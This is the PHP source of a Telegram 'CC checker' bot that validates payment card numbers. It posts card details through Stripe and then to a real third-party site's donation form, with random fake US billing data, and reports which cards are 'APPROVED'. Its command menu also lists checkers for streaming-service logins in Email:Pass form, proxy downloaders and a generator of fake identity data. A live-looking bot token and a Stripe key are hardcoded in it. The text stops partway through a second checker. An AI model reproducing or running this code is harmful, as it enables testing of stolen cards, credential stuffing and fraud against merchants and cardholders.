<?php

////////////////=============[Made with ❤️ by Aniruddh]===============////////////////

///https://api.telegram.org/bot<token>/setwebhook?url=<url>



$botToken = "1696754649:AAE9FhghiRb_OuwOZ7hzots3KDhP2FMO9CsE"; // Enter ur bot token
$website = "https://api.telegram.org/bot".$botToken;
error_reporting(0);
$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
$chatId = $update["message"]["chat"]["id"];
$gId = $update["message"]["from"]["id"];
$userId = $update["message"]["from"]["id"];
$firstname = $update["message"]["from"]["first_name"];
$username = $update["message"]["from"]["username"];
$message = $update["message"]["text"];
$message_id = $update["message"]["message_id"];

//////////=========[Start Command]=========//////////

if (strpos($message, "/start") === 0){
sendMessage($chatId, "<b>Hello there!%0AI am AniCHECKER!%0AType /cmds to know all my commands!!%0A%0ABot Made by: Aniruddh</b>", $message_id);
}





//////////=========[Cmds Command]=========//////////

elseif (strpos($message, "/cmds") === 0){ 
sendMessage($chatId, "<b>Credit Card Checkers:</b>%0A%0A<b>SK Based Checker:</b> <code>/str</code> CC|MM|YYYY|CVV%0A<b>Square Up Gate:</b> <code>/squ</code> CC|MM|YYYY|CVV%0A<b>Stripe CCN Gate:</b> <code>/chk</code> CC|MM|YYYY|CVV%0A<b>Stripe CVV Gate(MAINTENANCE):</b> <code>/cvv</code> CC|MM|YYYY|CVV%0A<b>Unknown Gate 1 (CHARGE $150) :</b> <code>/ukg</code> CC|MM|YYYY|CVV%0A<b>Unknown Gate 2 (CHARGE $49) :</b> <code>/unk</code> CC|MM|YYYY|CVV%0A%0A<b>Other Checkers:</b>%0A%0A<b>BIN Lookup:</b> <code>/bin</code> xxxxxx%0A<b>SK Key Check:</b> <code>/sk</code> sk_live_xxxxxxx%0A<b>Zee5 Checker:</b> <code>/zee5</code> Email:Pass%0A<b>VOOT Checker:</b> <code>/voot</code> Email:Pass%0A<b>ALT Balaji Checker:</b> <code>/altb</code> Email:Pass%0A<b>IBAN Checker:</b> <code>/iban</code> IBAN%0A%0A<b>MISCELLANEOUS:</b>%0A%0A<b>Currency Converter:</b> <code>/conv</code> 1 USD INR (converts 1 USD to INR)%0A<b>HTTP Proxies Downloader:</b> <code>/http</code>%0A<b>SOCKS4 Proxies Downloader:</b> <code>/socks4</code>%0A<b>SOCKS5 Proxies Downloader:</b> <code>/socks5</code>%0A<b>Random DATA Gen (USA):</b> <code>/dat</code>%0A<b>Random Jokes:</b> <code>/joke</code>%0A<b>Info:</b> <code>/info</code> To know your info%0A%0A<b>Bot Made by: Aniruddh</b>", $message_id); 
}

//////////=========[Info Command]=========//////////

elseif (strpos($message, "/info") === 0){
sendMessage($chatId, "<b>ID:</b> <code>$userId</code>%0A<b>First Name:</b> $firstname%0A<b>Username:</b> @$username%0A%0A<b>Bot Made by: Aniruddh</b>", $message_id);
}

//////////=========[Bin Command]=========//////////

elseif (strpos($message, "/bin") === 0){
$bin = substr($message, 5);
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
//$name = $fim['country']['alpha2']; ////country abbreviated example (US)
//$name = $fim['country']['name']; //// country
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$phone = GetStr($fim, '"phone":"', '"');
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
$binlenth = strlen($bin);
$schemename = ucfirst("$scheme");
$typename = ucfirst("$type");
///$test2 = GetStr($fim, '"alpha2":"', '"'); ////country abbreviated example (US)
if (empty($schemename)) {
    $schemename = "Unavailable";
}
if (empty($typename)) {
    $typename = "Unavailable";
}
if (empty($brand)) {
    $brand = "Unavailable";
}
if (empty($bank)) {
    $bank = "Unavailable";
}
if (empty($name)) {
    $name = "Unavailable";
}
if (empty($phone)) {
    $phone = "Unavailable";
}

curl_close($ch);

 


////////////////////////////////////////// RESPONSES ///////////////////////////////////////////////
curl_close($ch);
sendMessage($chatId, '<b>✅ Valid BIN</b>%0ABIN/IIN: <code>'.$bin.'</code> '.$emoji.'%0ACard Brand: <b><ins>'.$schemename.'</ins></b>%0ACard Type: <b><ins>'.$typename.'</ins></b>%0ACard Level: <b><ins>'.$brand.'</ins></b>%0ABank Name: <b><ins>'.$bank.'</ins></b>%0ACountry: <b><ins>'.$name.'</ins> - 💲<ins>'.$currency.'</ins></b>%0AIssuers Contact: <b><ins>'.$phone.'</ins></b>%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot Made by: Aniruddh </b>', $message_id);
}


curl_close($ch);

//////////////////////////===========RANDOM USER AGENT=============///////////////////////////////////
function random_ua() {
    $tiposDisponiveis = array("Chrome", "Firefox", "Opera", "Explorer");
    $tipoNavegador = $tiposDisponiveis[array_rand($tiposDisponiveis)];
    switch ($tipoNavegador) {
        case 'Chrome':
            $navegadoresChrome = array("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36',
            );
            return $navegadoresChrome[array_rand($navegadoresChrome)];
            break;
        case 'Firefox':
            $navegadoresFirefox = array("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
                'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0',
                'Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0',
                'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/29.0',
                'Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0',
                'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0',
            );
            return $navegadoresFirefox[array_rand($navegadoresFirefox)];
            break;
        case 'Opera':
            $navegadoresOpera = array("Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
                'Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16',
                'Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14',
                'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14',
                'Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02',
                'Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00',
                'Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00',
                'Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00',
                'Opera/12.0(Windows NT 5.1;U;en)Presto/22.9.168 Version/12.00',
                'Mozilla/5.0 (Windows NT 5.1) Gecko/20100101 Firefox/14.0 Opera/12.0',
            );
            return $navegadoresOpera[array_rand($navegadoresOpera)];
            break;
        case 'Explorer':
            $navegadoresOpera = array("Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
                'Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko',
                'Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1)',
                'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)',
                'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)',
            );
            return $navegadoresOpera[array_rand($navegadoresOpera)];
            break;
    }
}
$ua = random_ua(); 



//////////////////////////===========AUTH=============///////////////////////////////////
$allowed_id = (array("757533521","-1001299214423","-1001245854037","738044432","1235986907","1458234311","642191066","896399844","1398824036","1489800332","1111343333","-1001207290557","-1001445249123","800981876","-1001316496732"));//Useranme to allow please put here or chatid or user id

if (in_array($chatId, $allowed_id) === false){
 $unauth_msg = urlencode ("<b>Hey! <a href='tg://user?id=$userId'>$firstname</a>\nSorry, you are not authorized to use me right now!</b>\n<b>Have a Good day!</b>");
 sendMessage($chatId,$unauth_msg, $message_id);
return;
}
//////////=========[Chk Command]=========//////////

if ((strpos($message, "!chk") === 0)||(strpos($message, "/chk") === 0)){
$lista = substr($message, 5);
$i     = explode("|", $lista);
error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');
function multiexplode($delimiters, $string){
$one = str_replace($delimiters, $delimiters[0], $string);
$two = explode($delimiters[0], $one);
return $two;}
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mon = multiexplode(array(":", "|", ""), $lista)[1];
$year = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];
if(strlen($year) == 2){
$year = substr($year, -2);}
else{
$year = substr($year, 2);}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];}

///////////////////////////////////BIN LOOKUP START////////////////////////////////////////////////////////////////
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = getStr($fim, '"bank":{"name":"', '"');
$name = getStr($fim, '"name":"', '"');
$brand = getStr($fim, '"brand":"', '"');
$country = getStr($fim, '"country":{"name":"', '"');
$scheme = getStr($fim, '"scheme":"', '"');
$currency = getStr($fim, '"currency":"', '"');
$emoji = getStr($fim, '"emoji":"', '"');
$type = getStr($fim, '"type":"', '"');
if(strpos($fim, '"type":"credit"') !== false) {
$bin = 'Credit';
}else{
$bin = 'Debit';}
/////////////////////////////////////BIN LOOKUP END////////////////////////////////////////////////////////////////
//----------------------------------------------------------------------------------------------------------------------//
$first = str_shuffle("ZELTRAX");
$last = str_shuffle("ROCKZ");
$first1 = str_shuffle("zeltrax85246");
$email = "".$first1."%40gmail.com";
$address = "".rand(0000,9999)."+Main+Street";
$phone = rand(0000000000,9999999999);
$country = "US";
$st = array("AL","NY","CA","FL","WA");
$st1 = array_rand($st);
$state = $st[$st1];
if ($state == "NY"){
$zip = "10080";
$city = "New+York";}
elseif ($state == "WA"){
$zip = "98001";
$city = "Auburn";}
elseif ($state == "AL"){
$zip = "35005";
$city = "Adamsville";}
elseif ($state == "FL"){
$zip = "32003";
$city = "Orange+Park";}
else{
$zip = "90201";
$city = "Bell";};
//----------------------------------------------------------------------------------------------------------------------//
////////////////////////////////////===[For Authorizing Cards]////////////////////////////////////////////////////
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(  
'authority: api.stripe.com',
'accept: application/json',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
//========================================================================================================================//
//========================================================================================================================//
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[name]=Lund+Lele&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mon.'&card[exp_year]='.$year.'&guid=c4c32860-614a-435f-9fd1-8a5ec558a64f1dc88e&muid=4bc50a99-bc4c-42f2-a255-b94afb7d33fd117f98&sid=03951713-7936-4e99-aeb1-36d80837feea363dd9&pasted_fields=number&payment_user_agent=stripe.js%2F5c9ad5f6c%3B+stripe-js-v3%2F5c9ad5f6c&time_on_page=45735&referrer=https%3A%2F%2Fwww.collegetransitions.com%2F&key=pk_live_Dfe4fmdbUbN69IrQo3AVGKhm');
//========================================================================================================================//
//========================================================================================================================//
$result = curl_exec($ch);
$token = trim(strip_tags(getStr($result,'"id": "','"')));
////////////////////////////===============[For Charging Cards]=============////////////////////////
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.collegetransitions.com/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: www.collegetransitions.com',
'accept: application/json, text/javascript, */*; q=0.01',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'origin: https://www.collegetransitions.com',
'referer: https://www.collegetransitions.com/pay-now/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin'));
//========================================================================================================================//
//========================================================================================================================//
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=wp_full_stripe_inline_payment_charge&wpfs-form-name=DefaultPayment&wpfs-custom-amount-unique=1&wpfs-card-holder-name=Lund+Lele&wpfs-card-holder-email=lodalelell%40gmail.com&wpfs-billing-address-line-1=Loda&wpfs-billing-address-line-2=Loda&wpfs-billing-address-city=Berkeley&wpfs-billing-address-state=CA&wpfs-billing-address-zip=94701&wpfs-billing-address-country=AG&wpfs-stripe-payment-method-id='.$token.'');
//========================================================================================================================//
//========================================================================================================================//
$result2 = curl_exec($ch);
$info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
$time = substr($time, 0, 4);



//////////////////////////////////////////////////////////////////////////////////////////////////////////////

 if ((strpos($result2, 'incorrect_zip')) || (strpos($result2, 'Your card zip code is incorrect.')) || (strpos($result2, 'The zip code you supplied failed validation.'))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>✅APPROVED</b>%0A<b>RESPONSE:</b> <b>『 ★ CVV MATCHED ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result2, '"cvc_check":"pass"')) || (strpos($result2, "Thank You.")) || (strpos($result2, '"status": "succeeded"')) || (strpos($result2, "Thank You For Donation.")) || (strpos($result2, "Your payment has already been processed")) || (strpos($result2, "Success ")) || (strpos($result2, '"type":"one-time"')) || (strpos($result2, "/donations/thank_you?donation_number="))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>✅APPROVED</b>%0A<b>RESPONSE:</b> <b>『 ★ CVV MATCHED ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result2, 'Your card has insufficient funds.')) || (strpos($result2, 'insufficient_funds'))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>✅APPROVED</b>%0A<b>RESPONSE:</b> <b> 『 ★ CVV LIVE ★ 』 『 ★ Insufficient Funds ★ 』 </b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result2, "Your card's security code is incorrect.")) || (strpos($result2, "incorrect_cvc")) || (strpos($result2, "The card's security code is incorrect."))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>✅APPROVED</b>%0A<b>RESPONSE:</b> <b>『 ★ CCN MATCHED ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result2, "Your card does not support this type of purchase.")) || (strpos($result2, "transaction_not_allowed"))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>✅APPROVED</b>%0A<b>RESPONSE:</b> <b> 『 ★ CVV MATCHED ★ 』 『 ★ Card Doesnt Support Purchase ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result2, "pickup_card")) || (strpos($result2, "lost_card")) || (strpos($result2, "stolen_card"))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Pickup Card 「Reported Stolen Or Lost」 ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif (strpos($result2, "do_not_honor")){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Declined : Do_Not_Honor ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result2, 'The card number is incorrect.')) || (strpos($result2, 'Your card number is incorrect.')) || (strpos($result2, 'incorrect_number'))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Incorrect Card Number ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result2, 'Your card has expired.')) || (strpos($result2, 'expired_card'))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Expired Card ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif (strpos($result2, "generic_decline")){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Declined : Generic_Decline ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif (strpos($result1, "generic_decline")){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Declined : Generic_Decline ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result2, '"cvc_check":"unavailable"')) || (strpos($result2, '"cvc_check": "unchecked"')) || (strpos($result2, '"cvc_check": "fail"'))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Security Code Check : '.$cvc_check.' [Proxy Dead/change IP] ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result2, "Your card was declined.")) || (strpos($result2, 'The card was declined.'))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Card Declined ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif(!$result2){
sendMessage($chatId, ''.$result2.'');
}else{
sendMessage($chatId, ''.$result2.'');
}
curl_close($ch);
}



///////////////// STRIPE CVV /////////////////////////////////////////////////////////////////////////////



if ((strpos($message, "!cvv") === 0)||(strpos($message, "/cvv") === 0)){
$lista = substr($message, 5);
$i     = explode("|", $lista);
error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');
function multiexplode($delimiters, $string){
$one = str_replace($delimiters, $delimiters[0], $string);
$two = explode($delimiters[0], $one);
return $two;}
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];
if(strlen($year) == 2){
$year = substr($year, -2);}
else{
$year = substr($year, 2);}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];}

///////////////////////////////////BIN LOOKUP START////////////////////////////////////////////////////////////////
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = getStr($fim, '"bank":{"name":"', '"');
$name = getStr($fim, '"name":"', '"');
$brand = getStr($fim, '"brand":"', '"');
$country = getStr($fim, '"country":{"name":"', '"');
$scheme = getStr($fim, '"scheme":"', '"');
$currency = getStr($fim, '"currency":"', '"');
$emoji = getStr($fim, '"emoji":"', '"');
$type = getStr($fim, '"type":"', '"');
if(strpos($fim, '"type":"credit"') !== false) {
$bin = 'Credit';
}else{
$bin = 'Debit';}
/////////////////////////////////////BIN LOOKUP END////////////////////////////////////////////////////////////////
